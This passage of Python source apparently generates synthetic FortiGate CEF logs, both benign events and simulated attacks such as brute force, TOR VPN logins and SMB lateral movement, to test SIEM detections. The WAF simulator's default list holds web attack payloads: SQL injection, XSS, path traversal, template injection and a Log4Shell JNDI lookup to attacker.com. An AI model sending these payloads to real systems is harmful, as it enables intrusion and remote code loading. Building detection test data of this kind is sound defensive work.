        "FTNTFGTprofile":       profile,
        "FTNTFGTdtype":         "File",
        "FTNTFGTfiletype":      file_ext.upper(),
        "FTNTFGTfilesize":      file_size,
        "FTNTFGTfilename":      f"download.{file_ext}",
        "FTNTFGTurl":           f"https://{domain}/download.{file_ext}",
        "FTNTFGTprofile":       profile,
        "msg":                  f"File download inspected by AV: clean ({file_ext.upper()}, {file_size} bytes)",
    })
    return _format_fortinet_cef(config, "0211008192", "utm", "antivirus", "information", fields)


def _generate_ipsec_vpn_event(config):
    """IPSec VPN Phase-1 / Phase-2 negotiation event — event:vpn ipsec.

    Distinct from SSL VPN (_generate_vpn_event).  Represents site-to-site IPSec
    tunnels or remote-access IPSec clients negotiating IKE phase-1 (ISAKMP) and
    phase-2 (IPSec SA).  Uses UDP/500 (IKE) or UDP/4500 (NAT-T).
    """
    forti_conf   = _get_config(config)
    peer_gws     = forti_conf.get("ipsec_peer_gateways", [])
    if peer_gws:
        peer_ip = random.choice(peer_gws)
    else:
        peer_ip = _random_external_ip()
    geo          = _ext_geo()
    gw_ip        = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    tunnel_name  = random.choice(["Site-to-HQ", "Branch-VPN", "Azure-IPSec", "Remote-Access"])
    ike_port     = random.choices([500, 4500], weights=[70, 30], k=1)[0]
    phase        = random.choices(["phase1", "phase2"], weights=[40, 60], k=1)[0]
    is_up        = random.random() > 0.1

    if phase == "phase1":
        logid     = "0101037127"
        eventtype = "ike-negotiate"
        msg_text  = f"IKE Phase-1 {'completed' if is_up else 'failed'} with {peer_ip}"
    else:
        logid     = "0101037141"
        eventtype = "ipsec-negotiate"
        msg_text  = f"IPSec Phase-2 SA {'established' if is_up else 'failed'} for tunnel {tunnel_name}"

    fields = {
        "src":                  peer_ip,
        "dst":                  gw_ip,
        "spt":                  ike_port,
        "dpt":                  ike_port,
        "proto":                "17",
        "FTNTFGTeventtype":     eventtype,
        "FTNTFGTvpntunnel":     tunnel_name,
        "FTNTFGTtunneltype":    "ipsec",
        "FTNTFGTremotegw":      peer_ip,
        "FTNTFGTsrccountry":    geo["country"],
        "FTNTFGTsrccity":       geo["city"],
        "FTNTFGTsrcregion":     geo["region"],
        "act":                  "negotiate",
        "outcome":              "success" if is_up else "failed",
        "msg":                  msg_text,
        "externalId":           _session_id(),
    }
    return _format_fortinet_cef(config, logid, "event", "vpn", "notice" if is_up else "warning", fields)


def _generate_ssl_inspection(config, src_ip, user, shost):
    """SSL deep-packet inspection certificate event — utm:ssl."""
    destinations = config.get("benign_egress_destinations") or [{}]
    dest         = random.choice(destinations)
    dst_ip       = rand_ip_from_network(ip_network(dest.get("ip_range", "40.96.0.0/13"), strict=False))
    domain       = random.choice(config.get("benign_domains", ["microsoft.com"]))
    cipher       = random.choice(_TLS_CIPHERS)
    tls_ver      = random.choice(_TLS_VERSIONS)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept"
    )
    fields.update({
        "app":                  "HTTPS",
        "FTNTFGTsslaction":     "inspect",
        "FTNTFGTcipher":        cipher,
        "FTNTFGTtlsver":        tls_ver,
        "FTNTFGTscertcname":    f"*.{domain}",
        "FTNTFGTscertissuer":   random.choice(_TLS_ISSUERS),
        "FTNTFGTccertissuer":   random.choice(_TLS_ISSUERS),
        "FTNTFGTprofile":       _get_config(config).get("ssl_inspect_profile", "deep-inspection"),
        "msg":                  f"SSL inspection: {tls_ver} {cipher} to {domain}",
    })
    return _format_fortinet_cef(config, "0002000001", "utm", "ssl", "information", fields)


def _generate_benign_log(config, session_context=None):
    """Dispatches a benign log event based on event_mix.benign weights or hardcoded defaults."""
    forti_conf = _get_config(config)
    event_mix  = forti_conf.get("event_mix", {})
    benign_cfg = event_mix.get("benign", [])

    if benign_cfg:
        events  = [e["event"]  for e in benign_cfg]
        weights = [e["weight"] for e in benign_cfg]
    else:
        events  = ["traffic_forward", "inbound_block", "webfilter_allow", "dns_query",
                   "admin_event", "vpn_event", "ssl_inspection",
                   "ntp_sync", "antivirus_allow", "ipsec_vpn"]
        weights = [45,               18,              11,                7,
                   4,             4,            2,
                   4,           3,              2]

    chosen = random.choices(events, weights=weights, k=1)[0]

    # Resolve user/IP for events that need an internal source
    user, src_ip, shost = "unknown", "192.168.1.100", None
    if chosen not in ("inbound_block", "admin_event", "vpn_event", "ipsec_vpn"):
        if session_context:
            user_info = get_random_user(session_context, preferred_device_type="workstation")
            if user_info:
                user   = user_info["username"]
                src_ip = user_info["ip"]
                shost  = user_info.get("hostname")
        else:
            umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
            if umap:
                user, src_ip = random.choice(list(umap.items()))
                shost = _get_user_and_host_info(config, src_ip)[1]

    if chosen == "traffic_forward":
        return _generate_traffic_forward(config, src_ip, user, shost)
    elif chosen == "inbound_block":
        return _generate_inbound_block(config)
    elif chosen == "webfilter_allow":
        return _generate_webfilter_allow(config, src_ip, user, shost)
    elif chosen == "dns_query":
        return _generate_dns_query(config, src_ip, user, shost)
    elif chosen == "admin_event":
        return _generate_admin_event(config)
    elif chosen == "vpn_event":
        return _generate_vpn_event(config, session_context)
    elif chosen == "ntp_sync":
        return _generate_ntp_sync(config, src_ip, user, shost)
    elif chosen == "antivirus_allow":
        return _generate_antivirus_allow(config, src_ip, user, shost)
    elif chosen == "ipsec_vpn":
        return _generate_ipsec_vpn_event(config)
    else:  # ssl_inspection
        return _generate_ssl_inspection(config, src_ip, user, shost)


# ---------------------------------------------------------------------------
# Threat event generators
# ---------------------------------------------------------------------------

def _simulate_ips_attack(config):
    """Inbound IPS signature trigger — utm:ips (external attacker → internal server)."""
    print(f"    - Fortinet Module simulating: IPS attack (inbound)")
    forti_conf   = _get_config(config)
    config_sigs  = forti_conf.get("ips_rules", {})
    if config_sigs:
        name, sig_id = random.choice(list(config_sigs.items()))
        sig = {"name": name, "id": sig_id, "cve": None, "category": "Exploit", "severity": "high"}
    else:
        sig = random.choice(_IPS_SIGNATURES)

    dst_ip       = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    target_port  = random.choice([80, 443, 445, 8080, 1433, 3389])
    ext_ip       = _random_external_ip()
    geo          = _ext_geo()
    incident_id  = random.randint(100000, 999999)
    wan_iface    = forti_conf.get("interface_wan", "port1")
    lan_iface    = forti_conf.get("interface_lan", "port10")
    severity     = sig.get("severity", "high")
    log_level    = "critical" if severity == "critical" else "alert" if severity == "high" else "warning"

    fields = {
        "src":                      ext_ip,
        "spt":                      random.randint(1024, 65535),
        "dst":                      dst_ip,
        "dpt":                      target_port,
        "proto":                    "6",
        "act":                      "reset",
        "FTNTFGTutmaction":         "reset",
        "app":                      "HTTP" if target_port in (80, 8080) else "HTTPS",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  lan_iface,
        "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTprofile":           forti_conf.get("ips_profile", "default-ips"),
        "FTNTFGTeventtype":         "signature",
        "FTNTFGTattack":            sig["name"],
        "FTNTFGTattackid":          str(sig["id"]),
        "FTNTFGTvulnid":            str(sig["id"]),
        "FTNTFGTvulnname":          sig["name"],
        "FTNTFGTvulncat":           sig["category"],
        "FTNTFGTcveid":             sig.get("cve") or "",
        "FTNTFGTseverity":          severity,
        "FTNTFGTCRlevel":           severity,
        "FTNTFGTref":               f"https://www.fortiguard.com/encyclopedia/ips/{sig['id']}",
        "FTNTFGTincidentserialno":  incident_id,
        "FTNTFGTthreattype":        sig["category"],
        "request":                  "/malicious_payload",
        "FTNTFGThttpmethod":        "POST",
        "FTNTFGTsrccountry":        geo["country"],
        "FTNTFGTsrccity":           geo["city"],
        "FTNTFGTsrcregion":         geo["region"],
        "FTNTFGTdstcountry":        "Reserved",
        "out":                      random.randint(500, 5000),
        "in":                       random.randint(100, 2000),
        "FTNTFGTsentpkt":           random.randint(1, 10),
        "FTNTFGTrcvdpkt":           random.randint(0, 5),
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "msg":                      f"attack: {sig['name']},{sig['category']}",
    }
    return _format_fortinet_cef(config, "0419016384", "utm", "ips", log_level, fields)


def _simulate_antivirus(config, src_ip, user, shost):
    """File download blocked by antivirus — utm:antivirus."""
    print(f"    - Fortinet Module simulating: Antivirus block from {src_ip}")
    forti_conf   = _get_config(config)
    mal_files    = forti_conf.get("malicious_files", [{"fname": "malware.exe", "fileType": "EXE", "threatname": "Generic.Malware"}])
    mal_file     = random.choice(mal_files)
    fname        = mal_file.get("fname", "malware.exe")
    filetype     = mal_file.get("fileType", "EXE")
    threat_name  = mal_file.get("threatname", "Generic.Malware")
    blocked_cats = forti_conf.get("blocked_url_categories", {"Malware": "malware-site.com"})
    _, domain    = random.choice(list(blocked_cats.items()))
    geo          = _ext_geo()

    # sha256 (64 chars) → xdm.target.file.sha256
    sha256_hash  = hashlib.sha256(f"{src_ip}{fname}{time.time()}".encode()).hexdigest()
    file_size    = random.randint(50000, 5000000)
    client_app   = random.choice(_BROWSER_UA + _SUSPICIOUS_UA[:2])
    incident_id  = random.randint(100000, 999999)

    fields = _base_traffic_fields(
        config, src_ip, shost, user,
        _random_external_ip(), domain, "6", 80, "blocked",
        dst_country=geo["country"]
    )
    fields.update({
        "app":                  "HTTP",
        "act":                  "blocked",
        "FTNTFGTutmaction":     "blocked",
        "dhost":                domain,
        "FTNTFGTeventtype":     "virus",
        "fname":                fname,
        "fsize":                file_size,
        "FTNTFGTfilehash":      sha256_hash,
        "FTNTFGTfiletype":      filetype,
        "FTNTFGTvirus":         threat_name,
        "FTNTFGTvirusid":       str(random.randint(10000, 99999)),
        "FTNTFGTviruscat":      "Virus",
        "FTNTFGTCRlevel":       "critical",
        "FTNTFGTseverity":      "critical",
        "FTNTFGTref":           f"https://www.fortiguard.com/encyclopedia/virus/{threat_name.replace(' ','_')}",
        "FTNTFGTincidentserialno": incident_id,
        "FTNTFGTthreattype":    "Virus",
        "request":              f"http://{domain}/{fname}",
        "FTNTFGThttpmethod":    "GET",
        "requestClientApplication": client_app,
        "FTNTFGTprofile":       forti_conf.get("av_profile", "default-antivirus"),
        "FTNTFGTdstcountry":    geo["country"],
        "FTNTFGTdstcity":       geo["city"],
        "outcome":              "failed",
        "msg":                  f"File blocked by antivirus: {threat_name}",
    })
    return _format_fortinet_cef(config, "0702038400", "utm", "antivirus", "alert", fields)


def _simulate_webfilter_block(config, src_ip, user, shost):
    """URL blocked by FortiGuard category — utm:webfilter ftgd_blk."""
    print(f"    - Fortinet Module simulating: Webfilter block from {src_ip}")
    forti_conf   = _get_config(config)
    blocked_cats = forti_conf.get("blocked_url_categories", {"Malicious Websites": "evil-site.com"})
    cat_name, domain = random.choice(list(blocked_cats.items()))
    cat_id       = random.choice(_URL_CAT_BLOCKED)
    geo          = _ext_geo()

    fields = _base_traffic_fields(
        config, src_ip, shost, user,
        _random_external_ip(), domain, "6", 443, "blocked",
        dst_country=geo["country"]
    )
    fields.update({
        "app":                  "HTTPS",
        "act":                  "blocked",
        "FTNTFGTutmaction":     "blocked",
        "dhost":                domain,
        "FTNTFGTeventtype":     "ftgd_blk",
        "cat":                  str(cat_id),
        "FTNTFGTcatdesc":       cat_name,
        "requestContext":       cat_name,
        "request":              f"https://{domain}/",
        "FTNTFGThttpmethod":    random.choice(["GET", "POST"]),
        "FTNTFGThttpcode":      403,
        "FTNTFGTCRlevel":       "high",
        "FTNTFGTseverity":      "high",
        "FTNTFGTprofile":       forti_conf.get("webfilter_profile", "default-webfilter"),
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTdstcountry":    geo["country"],
        "FTNTFGTdstcity":       geo["city"],
        "outcome":              "failed",
        "msg":                  f"URL belongs to a denied category in policy: {cat_name}",
    })
    return _format_fortinet_cef(config, "0201008192", "utm", "webfilter", "warning", fields)


def _simulate_large_upload(config, src_ip, user, shost):
    """Anomalously large outbound data transfer — potential exfiltration."""
    print(f"    - Fortinet Module simulating: Large upload from {src_ip}")
    forti_conf   = _get_config(config)
    exfil_dests  = config.get("exfiltration_destinations") or [{}]
    dest         = random.choice(exfil_dests)
    dst_ip       = rand_ip_from_network(ip_network(dest.get("ip_range", "154.53.224.0/24"), strict=False))
    domain       = dest.get("domain", "file-sharing-service.com")
    geo          = _ext_geo()
    sent_mb      = random.randint(100, 500)
    duration_s   = random.randint(300, 1800)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        duration_s=duration_s, dst_country=geo["country"]
    )
    fields.update({
        "app":              "HTTPS",
        "out":              sent_mb * 1024 * 1024,
        "in":               random.randint(1000, 10000),
        "FTNTFGTapp":       "HTTPS.Upload",
        "FTNTFGTappid":     40569,
        "FTNTFGTappcat":    "Cloud.Storage",
        "FTNTFGTapprisk":   "high",
        "FTNTFGTpolicyid":  forti_conf.get("file_share_policy_id", "10"),
        "FTNTFGTpolicyname": forti_conf.get("file_share_policy_name", "allow-file-sharing"),
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "requestClientApplication": random.choice(_BROWSER_UA),
        "msg":              f"Large outbound transfer {sent_mb}MB to {domain}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields)


def _simulate_port_scan(config, src_ip, user, shost):
    """Internal host performing port scan — multiple deny events (returns list)."""
    print(f"    - Fortinet Module simulating: Port scan from {src_ip}")
    forti_conf  = _get_config(config)
    dst_ip      = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    lan_iface   = forti_conf.get("interface_lan", "port10")
    port_count  = random.randint(30, 80)
    ports       = random.sample(range(1, 1024), k=port_count)
    logs        = []

    for port in ports:
        fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost or src_ip,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      port,
            "proto":                    "6",
            "act":                      "deny",
            "app":                      "UNKNOWN",
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          "0",
            "FTNTFGTpolicyname":        "implicit-deny",
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          0,
            "out":                      0,
            "in":                       0,
            "FTNTFGTsentpkt":           1,
            "FTNTFGTrcvdpkt":           0,
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(),
            "externalId":               _session_id(),
            "outcome":                  "failed",
            "reason":                   "no-policy-match",
            "msg":                      f"Denied by forward policy check port {port}",
        }
        logs.append(_format_fortinet_cef(config, "0000000014", "traffic", "forward", "warning", fields))
    return logs


def _simulate_waf_attack(config, src_ip, user, shost):
    """WAF HTTP constraint violation — utm:waf (Fortinet-specific)."""
    print(f"    - Fortinet Module simulating: WAF attack from {src_ip}")
    forti_conf   = _get_config(config)
    dst_ip       = random.choice(config.get("internal_servers", ["172.16.200.55"]))
    payloads     = forti_conf.get("waf_attack_payloads", [
        "' OR 1=1--", "<script>alert(1)</script>",
        "../../../etc/passwd", "; DROP TABLE users;--",
        "{{7*7}}", "${jndi:ldap://attacker.com/a}",
    ])
    payload      = random.choice(payloads)
    waf_events   = ["waf-http-constraint", "waf-method-policy", "waf-address-policy",
                    "waf-url-policy", "waf-parameter-length"]
    constraint   = random.choice(["url-param-num", "max-url-param-length", "illegal-http-method",
                                   "hostname-check", "max-cookie-name-length"])
    client_app   = random.choice(_SUSPICIOUS_UA)
    wan_iface    = forti_conf.get("interface_wan", "port1")

    fields = {
        "src":                      src_ip,
        "spt":                      random.randint(1024, 65535),
        "shost":                    shost or src_ip,
        "suser":                    user,
        "dst":                      dst_ip,
        "dpt":                      random.choice([80, 443, 8080, 8443]),
        "proto":                    "6",
        "act":                      "blocked",
        "FTNTFGTutmaction":         "blocked",
        "app":                      "HTTP",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  forti_conf.get("interface_lan", "port10"),
        "FTNTFGTpolicyid":          forti_conf.get("waf_policy_id", "15"),
        "FTNTFGTpolicyname":        forti_conf.get("waf_policy_name", "web-server-policy"),
        "FTNTFGTprofile":           forti_conf.get("waf_profile", "default-waf"),
        "FTNTFGTeventtype":         random.choice(waf_events),
        "FTNTFGTconstraint":        constraint,
        "FTNTFGTseverity":          random.choice(["medium", "high"]),
        "FTNTFGTCRlevel":           "medium",
        "request":                  f"http://{dst_ip}/search.php?q={payload}",
        "FTNTFGThttpmethod":        random.choice(["GET", "POST", "PUT"]),
        "requestClientApplication": client_app,
        "FTNTFGTsrccountry":        random.choice(_EXT_LOCATIONS)["country"],
        "FTNTFGTdstcountry":        "Reserved",
        "out":                      random.randint(200, 2000),
        "in":                       random.randint(100, 1000),
        "FTNTFGTsentpkt":           random.randint(1, 5),
        "FTNTFGTrcvdpkt":           random.randint(0, 3),
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "msg":                      f"WAF constraint violation: {constraint}",
    }
    return _format_fortinet_cef(config, "0930022816", "utm", "waf", "warning", fields)


def _simulate_auth_brute_force(config):
    """
    Admin console brute force — repeated failed event:system logins.
    Returns list of log strings.
    """
    print(f"    - Fortinet Module simulating: Admin brute force")
    forti_conf  = _get_config(config)
    admin_users = forti_conf.get("admin_users", ["admin", "root"])
    mgmt_ip     = forti_conf.get("management_ip", "172.16.200.1")
    attacker_ip = _random_external_ip()
    target_user = random.choice(admin_users)
    attempt_cnt = random.randint(20, 50)
    logs        = []

    for _ in range(attempt_cnt):
        fields = {
            "FTNTFGTlogdesc": "Admin login failed",
            "duser":         target_user,
            "src":           attacker_ip,
            "dst":           mgmt_ip,
            "act":           "login",
            "outcome":       "failed",
            "reason":        random.choice(["name_invalid", "passwd_invalid", "two-factor-auth-failed"]),
            "FTNTFGTmethod": random.choice(["https", "ssh"]),
            "sproc":         f"https({attacker_ip})",
            "FTNTFGTsrccountry": random.choice(_EXT_LOCATIONS)["country"],
            "msg":           f"Administrator {target_user} login failed from https({attacker_ip})",
        }
        logs.append(_format_fortinet_cef(config, "0100032002", "event", "system", "alert", fields))
    return logs


def _simulate_vpn_brute_force(config):
    """
    SSL VPN credential stuffing — repeated failed tunnel events.
    Returns list of log strings.
    """
    print(f"    - Fortinet Module simulating: VPN brute force")
    forti_conf   = _get_config(config)
    gw_ip        = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    attacker_ip  = _random_external_ip()
    geo          = _ext_geo()
    attempt_cnt  = random.randint(15, 40)
    # Cycle through usernames for credential stuffing
    candidate_users = ["admin", "vpnuser", "jsmith", "bjones", "mwilliams",
                       "rthomas", "agarcia", "dlee", "service", "test"]
    logs         = []

    for i in range(attempt_cnt):
        user = candidate_users[i % len(candidate_users)]
        fields = {
            "src":                  attacker_ip,
            "dst":                  gw_ip,
            "dpt":                  443,
            "proto":                "6",
            "suser":                user,
            "FTNTFGTxauthuser":     user,
            "FTNTFGTxauthgroup":    "N/A",
            "FTNTFGTtunneltype":    "ssl-vpn",
            "FTNTFGTremotegw":      attacker_ip,
            "FTNTFGTvpntunnel":     "SSL-VPN-Tunnel",
            "FTNTFGTduration":      0,
            "act":                  "tunnel-down",
            "outcome":              "failed",
            "reason":               "sslvpn_login_permission_denied",
            "FTNTFGTsrccountry":    geo["country"],
            "FTNTFGTsrccity":       geo["city"],
            "externalId":           _session_id(),
            "msg":                  f"SSL VPN login failed for user {user}",
        }
        logs.append(_format_fortinet_cef(config, "0101039428", "event", "vpn", "warning", fields))
    return logs


def _simulate_vpn_impossible_travel(config, session_context=None):
    """
    Same VPN user authenticated from two geographically distant IPs within minutes.
    Returns list of two log strings.
    """
    print(f"    - Fortinet Module simulating: VPN impossible travel")
    forti_conf  = _get_config(config)
    gw_ip       = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    travel      = config.get("impossible_travel_scenario", {})
    benign_loc  = travel.get("benign_location",     {"ip": "68.185.12.14",   "country": "United States", "city": "New York"})
    suspect_loc = travel.get("suspicious_location", {"ip": "175.45.176.10",  "country": "China",         "city": "Shanghai"})

    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else "jsmith"
    else:
        user = random.choice(["jsmith", "bjones", "mwilliams"])

    tunnel_id   = random.randint(100000, 999999)
    logs        = []

    # Session 1 — trusted location
    f1 = {
        "src": benign_loc["ip"], "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user, "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid": tunnel_id, "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip": f"10.212.134.{random.randint(100,200)}",
        "FTNTFGTassignip": f"10.212.134.{random.randint(100,200)}",
        "FTNTFGTremotegw": benign_loc["ip"], "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        "act": "tunnel-up", "outcome": "success",
        "FTNTFGTsrccountry": benign_loc.get("country", "United States"),
        "FTNTFGTsrccity":    benign_loc.get("city", "New York"),
        "FTNTFGTduration":   0,
        "externalId": _session_id(),
        "msg": f"SSL VPN tunnel-up for {user} from {benign_loc.get('country','US')}",
    }
    logs.append(_format_fortinet_cef(config, "0101039426", "event", "vpn", "notice", f1))

    # Session 2 — distant suspicious location (same user, minutes later)
    f2 = {
        "src": suspect_loc["ip"], "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user, "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid": tunnel_id + 1, "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip": f"10.212.134.{random.randint(100,200)}",
        "FTNTFGTassignip": f"10.212.134.{random.randint(100,200)}",
        "FTNTFGTremotegw": suspect_loc["ip"], "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        "act": "tunnel-up", "outcome": "success",
        "FTNTFGTsrccountry": suspect_loc.get("country", "China"),
        "FTNTFGTsrccity":    suspect_loc.get("city", "Shanghai"),
        "FTNTFGTduration":   0,
        "externalId": _session_id(),
        "msg": f"SSL VPN tunnel-up for {user} from {suspect_loc.get('country','China')} (possible travel anomaly)",
    }
    logs.append(_format_fortinet_cef(config, "0101039426", "event", "vpn", "notice", f2))
    return logs


def _simulate_vpn_tor_login(config, session_context=None):
    """Successful SSL VPN session established from a known TOR exit node IP.

    A valid corporate credential authenticated via TOR — indicating credential theft
    or deliberate anonymisation. tunnel-up (action=success) fires from a tor_exit_nodes
    IP. Detection signal: TOR IP + VPN tunnel-up + outcome=success.

    Triggers XSIAM: Suspicious VPN Login / TOR-based Access analytics detection.
    Returns list of log strings (one tunnel-up event).
    """
    print("    - Fortinet Module simulating: VPN Login from TOR Exit Node (successful)")
    forti_conf = _get_config(config)
    gw_ip      = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    tor_nodes  = config.get("tor_exit_nodes", [])
    tor_ip     = random.choice(tor_nodes).get("ip", _random_external_ip()) if tor_nodes else _random_external_ip()

    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user      = user_info["username"] if user_info else "jsmith"
    else:
        user = random.choice(["jsmith", "bjones", "mwilliams"])

    tunnel_ip = f"10.212.134.{random.randint(100, 200)}"
    tunnel_id = random.randint(100000, 999999)

    fields = {
        "src":               tor_ip,
        "dst":               gw_ip,
        "dpt":               443,
        "proto":             "6",
        "suser":             user,
        "FTNTFGTxauthuser":  user,
        "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid":   tunnel_id,
        "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip":   tunnel_ip,
        "FTNTFGTassignip":   tunnel_ip,
        "FTNTFGTremotegw":   tor_ip,
        "FTNTFGTvpntunnel":  "SSL-VPN-Tunnel",
        "FTNTFGTsrccountry": "Unknown",
        "FTNTFGTsrccity":    "Unknown",
        "FTNTFGTsrcregion":  "Unknown",
        "FTNTFGTduration":   0,
        "externalId":        _session_id(),
        "act":               "tunnel-up",
        "outcome":           "success",
        "msg":               f"SSL VPN tunnel established for {user} from TOR exit node {tor_ip}",
    }
    return [_format_fortinet_cef(config, "0101039426", "event", "vpn", "notice", fields)]


def _simulate_smb_new_host_lateral(config, src_ip, user, shost, session_context=None):
    """SMB connections from one internal workstation to multiple unfamiliar internal hosts.

    Generates 5–10 traffic accept events on TCP/445 to DIFFERENT internal destinations.
    Both interfaces are the LAN interface (internal east-west). The breadth of distinct
    SMB targets from a single source is the XSIAM UEBA detection signal.

    Returns list of CEF log strings.
    """
    print(f"    - Fortinet Module simulating: SMB New-Host Lateral from {src_ip}")
    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")
    n_hosts    = random.randint(5, 10)

    dest_ips = set()
    if session_context:
        for _ in range(30):
            peer = get_random_user(session_context, preferred_device_type="workstation")
            if peer and peer.get("ip") and peer["ip"] != src_ip:
                dest_ips.add(peer["ip"])
            if len(dest_ips) >= n_hosts:
                break
    while len(dest_ips) < n_hosts:
        internal_nets = config.get("internal_networks", ["192.168.1.0/24"])
        try:
            host = rand_ip_from_network(ip_network(random.choice(internal_nets), strict=False))
            if host != src_ip:
                dest_ips.add(host)
        except (AddressValueError, ValueError, IndexError):
            pass

    logs = []
    for dst_ip in list(dest_ips)[:n_hosts]:
        duration_s = random.randint(5, 120)
        fields = {
            "src":                     src_ip,
            "spt":                     random.randint(49152, 65535),
            "shost":                   shost or src_ip,
            "suser":                   user,
            "dst":                     dst_ip,
            "dpt":                     445,
            "proto":                   "6",
            "app":                     "SMB",
            "act":                     "accept",
            "deviceInboundInterface":  lan_iface,
            "deviceOutboundInterface": lan_iface,
            "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":       "Allow_Internal_SMB",
            "FTNTFGTsrccountry":       "Reserved",
            "FTNTFGTdstcountry":       "Reserved",
            "FTNTFGTduration":         duration_s,
            "out":                     random.randint(200, 5000),
            "in":                      random.randint(2000, 50000),
            "FTNTFGTsentpkt":          random.randint(2, 20),
            "FTNTFGTrcvdpkt":          random.randint(5, 50),
            "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":           _random_mac(),
            "externalId":              _session_id(),
            "outcome":                 "success",
            "msg":                     f"SMB connection to new host {src_ip} → {dst_ip}:445",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_smb_rare_file_transfer(config, src_ip, user, shost):
    """Large SMB file transfer (100 MB – 1 GB) between internal hosts — data staging signal.

    A single long-duration SMB/445 session with anomalously large 'out' (sent) bytes.
    Both interfaces are LAN. The large data volume on an internal SMB session is the
    XSIAM UEBA detection signal (bulk copy from sensitive share).

    Returns single CEF log string.
    """
    print(f"    - Fortinet Module simulating: SMB Rare File Transfer from {src_ip}")
    forti_conf       = _get_config(config)
    lan_iface        = forti_conf.get("interface_lan", "port10")
    internal_servers = config.get("internal_servers", ["10.0.10.50"])
    dst_ip     = random.choice([s for s in internal_servers if s != src_ip] or internal_servers)
    file_size  = random.randint(104_857_600, 1_073_741_824)  # 100 MB – 1 GB
    duration_s = random.randint(120, 900)

    fields = {
        "src":                     src_ip,
        "spt":                     random.randint(49152, 65535),
        "shost":                   shost or src_ip,
        "suser":                   user,
        "dst":                     dst_ip,
        "dpt":                     445,
        "proto":                   "6",
        "app":                     "SMB",
        "act":                     "accept",
        "deviceInboundInterface":  lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname":       "Allow_Internal_SMB",
        "FTNTFGTsrccountry":       "Reserved",
        "FTNTFGTdstcountry":       "Reserved",
        "FTNTFGTduration":         duration_s,
        "out":                     file_size,  # large read from file share = staging
        "in":                      random.randint(1000, 50000),
        "FTNTFGTsentpkt":          random.randint(100000, 1000000),
        "FTNTFGTrcvdpkt":          random.randint(1000, 50000),
        "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":           _random_mac(),
        "externalId":              _session_id(),
        "outcome":                 "success",
        "msg":                     f"Large SMB transfer {file_size // (1024 * 1024)}MB: {src_ip} → {dst_ip}:445",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _simulate_smb_share_enumeration(config, src_ip, user, shost):
    """Rapid TCP/445 connections to many different internal hosts — share scanning.

    15–40 short-duration accept events on SMB/445 to distinct internal destinations.
    The source explores the network for accessible shares. XSIAM detects the
    high-volume SMB connection pattern from one workstation to many new targets.

    Returns list of CEF log strings.
    """
    print(f"    - Fortinet Module simulating: SMB Share Enumeration from {src_ip}")
    forti_conf    = _get_config(config)
    lan_iface     = forti_conf.get("interface_lan", "port10")
    n_targets     = random.randint(15, 40)
    internal_nets = config.get("internal_networks", ["192.168.1.0/24"])

    target_ips = set()
    while len(target_ips) < n_targets:
        try:
            host = rand_ip_from_network(ip_network(random.choice(internal_nets), strict=False))
            if host != src_ip:
                target_ips.add(host)
        except (AddressValueError, ValueError, IndexError):
            pass

    logs = []
    for dst_ip in list(target_ips)[:n_targets]:
        fields = {
            "src":                     src_ip,
            "spt":                     random.randint(49152, 65535),
            "shost":                   shost or src_ip,
            "suser":                   user,
            "dst":                     dst_ip,
            "dpt":                     445,
            "proto":                   "6",
            "app":                     "SMB",
            "act":                     "accept",  # Allow — volume is detection signal
            "deviceInboundInterface":  lan_iface,
            "deviceOutboundInterface": lan_iface,
            "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":       "Allow_Internal_SMB",
